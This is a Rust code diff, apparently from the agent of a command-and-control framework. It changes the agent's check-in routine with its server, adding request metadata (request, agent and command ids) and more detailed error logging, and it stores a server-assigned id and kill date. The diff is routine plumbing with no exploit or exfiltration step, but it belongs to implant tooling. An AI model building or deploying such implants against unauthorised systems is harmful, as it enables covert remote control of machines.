@@ -6,6 +6,7 @@ use kageshirei_communication_protocol::{
     communication::CheckinResponse,
     error::{Format as FormatError, Protocol as ProtocolError},
     Format as _,
+    Metadata,
     Protocol as _,
 };
 use kageshirei_format_json::FormatJson;
@@ -16,6 +17,7 @@ use mod_agentcore::{instance, instance_mut};
 use mod_protocol_http::HttpProtocol;
 
 use super::system_data::checkin_from_raw;
+use crate::common::utils::generate_request_id;
 
 /// Initializes the communication protocol and attempts to connect to the server.
 pub fn initialize_protocol<R>(rt: Arc<R>)
@@ -46,15 +48,23 @@ where
 
                 match formatter.write(checkin_data, None::<BTreeMap<&str, &str>>) {
                     Ok(data) => {
-                        let result: Result<Vec<u8>, ProtocolError> =
-                            rt.block_on(async { protocol.send(data, None).await });
+                        let result: Result<Vec<u8>, ProtocolError> = rt.block_on(async {
+                            protocol
+                                .send(
+                                    data,
+                                    Some(Arc::new(Metadata {
+                                        request_id: generate_request_id(32),
+                                        agent_id:   String::new(),
+                                        command_id: String::new(),
+                                        path:       Some("checkin".to_owned()),
+                                    })),
+                                )
+                                .await
+                        });
 
                         match result {
                             Ok(response) => {
-                                match formatter.read::<CheckinResponse, FormatError>(
-                                    response.as_slice(),
-                                    None::<BTreeMap<&str, FormatError>>,
-                                ) {
+                                match formatter.read::<CheckinResponse, &str>(response.as_slice(), None) {
                                     Ok(checkin_response) => {
                                         instance_mut().config.id = checkin_response.id;
                                         instance_mut().config.kill_date = checkin_response.kill_date;
@@ -65,18 +75,18 @@ where
                                         // If successful, mark the session as connected
                                         instance_mut().session.connected = true;
                                     },
-                                    Err(_) => {
-                                        libc_eprintln!("Format error checkin response data");
+                                    Err(e) => {
+                                        libc_eprintln!("[-] Checkin Response format error: {:?}", e);
                                     },
                                 }
                             },
-                            Err(_) => {
-                                libc_eprintln!("Protocol error");
+                            Err(e) => {
+                                libc_eprintln!("{:?}", e);
                             },
                         }
                     },
-                    Err(_) => {
-                        libc_eprintln!("Format error checkin data");
+                    Err(e) => {
+                        libc_eprintln!("{:?}", e);
                     },
                 }
             }
